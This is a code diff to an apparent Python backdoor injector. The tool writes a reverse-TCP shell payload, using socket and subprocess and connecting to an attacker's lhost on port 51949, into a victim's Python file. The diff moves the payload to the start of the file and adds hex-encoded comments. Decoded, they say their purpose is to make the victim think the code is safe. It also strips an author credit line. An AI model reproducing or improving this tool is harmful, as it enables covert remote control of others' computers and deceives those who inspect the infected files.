@@ -1,4 +1,4 @@
-#Software By HiCo Adam/NSK B3
+
 import sys
 print """        
                                                       
@@ -46,6 +46,40 @@ def inject_backdoor():
 		quit()
 	original_content = f.read()
 	code = '''
+#Code
+#74 68 69 
+#73 20 68 
+#65 78 61 
+#64 65 63 69 
+#6d 61 6c 
+#20 69 73 
+#20 75 73 
+#65 64 
+#20 74 6f 
+#20 6d 61 
+#6b 65 20
+#74 68 65 
+#20 76 69 
+#63 74 69 
+#6d 20 74 
+#68 69 6e 
+#6b 20 74
+#68 61 74 20 74 6
+#8 69 73 20 6
+#3 6f 64 65 20 69 73 2
+#0 73 61 66 65 2c 20 77 68 65 6e 20 
+#74 68 65 79 20 6c 6f 6f 6b 20 69
+#6e 74 6f 2
+#0 69 74 2e 20 44 6f
+#70 65 2e
+####################
+####################
+####################
+####################
+####################
+####################
+#@@@@@@@@@@@@@@@@@@#
+#@&$#|>#&\#&@#&>#&##
 import socket, subprocess
 print "Loading, DO NOT EXIT THIS APPLICATION!"
 host = "%s"\nport = 51949
@@ -61,7 +95,7 @@ while True:
 		s.sendall(CMD.stderr.read())
 
 \n''' % lhost
-	BACKDOORED_CODE = str(original_content) + code
+	BACKDOORED_CODE = code + str(original_content)
 	wf = open(file, 'w')
 	wf.write(BACKDOORED_CODE)
 	file2 = open("reverse_tcp_server.py", "w")
